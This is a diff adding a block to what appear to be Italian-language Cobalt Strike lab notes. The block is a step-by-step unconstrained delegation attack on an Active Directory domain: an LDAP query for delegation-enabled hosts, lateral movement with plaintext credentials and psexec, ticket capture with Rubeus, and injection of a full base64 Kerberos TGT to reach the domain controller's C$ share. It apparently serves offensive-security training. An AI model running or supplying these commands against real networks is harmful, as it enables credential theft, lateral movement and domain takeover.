@@ -1047,4 +1047,29 @@ jobs
 
 #killa il job selezionato
 jobkill 0
+
+##########################################
+#Vedo su quali computer è configurata l'uncostrained delegation
+ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
+
+#Mi muovo su uno di loro
+make_token CONTOSO\rsteel Passw0rd!
+jump psexec64 lon-ws-1 smb
+
+#dal nuovo beacon runno rubeus
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
+
+#trovato il ticket lo copio e lo injectio
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:doIFjjCCBYqgAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFMwggRPoAMCARKhAwIBAqKCBEEEggQ9MQd9Ydm9uCk/6tgshGHI+INT3Jusnqiype6LbCoTmrYUqcr7rCp4R9gLEIggGN6GTMQlw9Pr4JFVimsavdb8LySKsrXP/00AAgAMD2sI1rWO9WCYb0Mh15PK4BKaLinjKj5ByQJQfrrFHzX+wz+DrpNaonJkDiAPQYuyZwxqRVvW3RXRcGfiX/EgNkwHaS6q0xWznfJDMw1L8HB7dI9WVcV78STeEFLVdHgB16mbtyZtZGLdcExxS4I6o8G9kpqWxj+NnwFiauxyyYRSK1ly25VnK+/c7YH+I2A40rTIfGMb4ukXDUvQm6bRsl+18sFZenqa0VbbSSrnBQ815829sgsdPOmuqwXdwRntG2BuSXAA0/CcMK6HEoPJg8uMA+LkBB/VFR5P9fidmHj0vN9hiWt7TXvqKYC6ZTGQeL4Q7jleb/XyLDrslfn5Nb/0RMIN6ZNVh60dUq6P8Znhf1xxKyd9adKNeDFA+VapRG+Y1/ymy/DcfThYcCuDad6hXBY/XqVEcdh9TNOPURWAbpw3EVH07dPi5xm9PTwuQmSyrjf4d74twQZJdqqaGzSs18/hQzJQGRfrGSgv+RyKl70fxll+LV5MI4T7v3mi08Dt7U1XtJT+iR6XmDBGB4WwIh45EViQPDwn8NCvFdBelIqdh2HiMsQ/56o7FG8UCuhIoNd3dSZU/CpA8h2pLQWAx5ZIOjHP6wNE/UfoQbmD8QB/st5aC6fJRFw1VRMzG2bpznAkZAmj2bEem4wOx3l1M3KAndB7EUG7lhN1oFQXQnkAvWsX+vu8Pyac0BxamvIwRSMBWuuaq35SJSDPI7fXFh64TpvKgvsfGX2rkiXbVVIIdyWfWiC7MzHKJhNItH/YopAH6g9SONiFXUjRlU9b78rLPL2c5Ht5cCLPb+fGEPdkH7XfrdPhOgJ+az5nIt8apUHB9Z3B712Uc6l6Vh5cgMj2brmQ8Gj8FuxBYyXwKKbqfN/qUYfTke9Rnv0Fm9gko9GXRHfKzdtPIMD0kia1+ht4EmtIIrdyoTmC3Z0PAvMsBxqqUJ/Z5u5wkoNT/izKAuuoT6UfiugKEkaU4w+DSBMMHn6CDw4bvPtfITuEaY9rJ2O7j6trgZARs50gIa7KKblUpgiYWGzs5BH2kQGpY8hrtHHS15k6XS2S8MBQe7IkQ8wTEueGhnQKb6njE+S7Kw58T7nOXeJmkjbq5Urhi/pr2eioW883VuuC9cL34aqfeAjWA2OPmwsjoNjcaWnffOuisptwW159RbeHEMptiwhdbPFS3C4atJ304IUcr83PBey9FRpIjnqOw6HymFaLwUoj43EOc27+zfNbSmnVBg3DDrJVssC/7+vlJxjDbV0xu13XiPyE8P8T9LiM+HPhh37vHPgFHKijoTdZUimmUKMoiXjiULI6M5W+6DK3PNT5ZYBpxB7KBjfuMaOrTAujgeAwgd2gAwIBAKKB1QSB0n2BzzCBzKCByTCBxjCBw6ArMCmgAwIBEqEiBCArsSZsp1bUPz/LXWkg/Nd4erdDoc4Mh0MuHyaSJRz61KENGwtDT05UT1NPLkNPTaISMBCgAwIBAaEJMAcbBWR5b3JrowcDBQBgoQAApREYDzIwMjUwODEyMTQ1MTU4WqYRGA8yMDI1MDgxMzAwNTE1NVqnERgPMjAyNTA4MTkxNDUxNTVaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==
+
+#ora ha creato il processo e mi ci collego
+steal_token 1968
+
+#check se ci sta il ticket
+run klist
+
+vedo se posso accedere al dc
+ls \\lon-dc-1\c$
+##########################################
+
 ```
